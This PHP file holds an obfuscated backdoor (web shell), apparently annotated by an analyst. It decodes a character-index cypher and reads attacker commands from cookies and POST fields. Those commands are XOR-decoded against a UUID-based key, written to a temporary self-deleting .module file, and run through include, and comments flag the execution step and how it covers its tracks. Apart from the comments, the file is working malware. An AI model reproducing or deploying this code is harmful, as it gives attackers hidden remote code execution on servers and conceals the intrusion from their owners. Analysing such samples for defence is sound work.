<?php
function cypher_decode($s2){
	$cypher = "- m64/_byhg7l?dskLE3)@rH#'(avun8Ic;e.F" ."<*1o5pt09fix" ; # This is what the cypher_array below references to obfuscate code
	$q5='';foreach($s2 as $w4){$q5.=$cypher[$w4];}return $q5;
}

$cypher_array = Array();
$cypher_array[] = cypher_decode(Array(19,42,31,47,3,4,14,3,0,14,42,14,42,0,4,3,3,40,0,27,46,11,19,0,46,7,14,40,4,33,7,45,7,42,42,46));
$cypher_array[] = cypher_decode(Array(13,43,9,43,1,21,29,30,12,48,30,16,26,6,6,37,32,17,18,6,6,20,34,1));
$cypher_array[] = cypher_decode(Array(36,2,41,14,29,12,35));
$cypher_array[] = cypher_decode(Array(23,39));
$cypher_array[] = cypher_decode(Array(36,5));
$cypher_array[] = cypher_decode(Array(24));
$cypher_array[] = cypher_decode(Array(38));
$cypher_array[] = cypher_decode(Array(47,48,12,35,6,43,29,44,6,33,41,30,44,35,30,44,15));
$cypher_array[] = cypher_decode(Array(27,22,22,27,8,6,2,35,22,10,35));
$cypher_array[] = cypher_decode(Array(15,44,22,6,22,35,43,35,27,44));
$cypher_array[] = cypher_decode(Array(35,49,43,12,41,14,35));
$cypher_array[] = cypher_decode(Array(15,29,7,15,44,22));
$cypher_array[] = cypher_decode(Array(29,30,12,48,30,16));
$cypher_array[] = cypher_decode(Array(15,44,22,12,35,30));
$cypher_array[] = cypher_decode(Array(43,27,33,16));
$cypher_array[] = cypher_decode(Array(2,14,42));

# this loop checks each cookie / post submitted with the request and check it for instructions
foreach (array_merge($_COOKIE, $_POST) as $key => $value){
		
	function decode_command($key, $t10){
		return substr(str_repeat($key . '358f64d6-d5d5-4661-a973-9bd14cb0b559', ($t10 / strlen($key)) + 1), 0, $t10);
	}
	
	function convert_command($command_array){return @pack('H*', $command_array);} 
			
	function execute_command($command_array){
		if (isset($command_array[2])){ 
			$a13 = './' . md5('358f64d6-d5d5-4661-a973-9bd14cb0b559') . '.module';
			@file_put_contents($a13,' <' . "?php @unlink(__FILE__);" . /*This is where code is executed*/$command_array[1]($command_array[2])/*This is where code is executed*/);
			@include($a13);
			@unlink($a13); # This deletes the file to cover it's tracks
			exit();
		}
	}
	
	
	$value = convert_command($value);
	
	# This attempts to run the n9 function above which checks to see if a post/cookie exists and then creats a temporary file that it executes.
	execute_command(explode('#', $value ^ decode_command($key, strlen($value))));
}
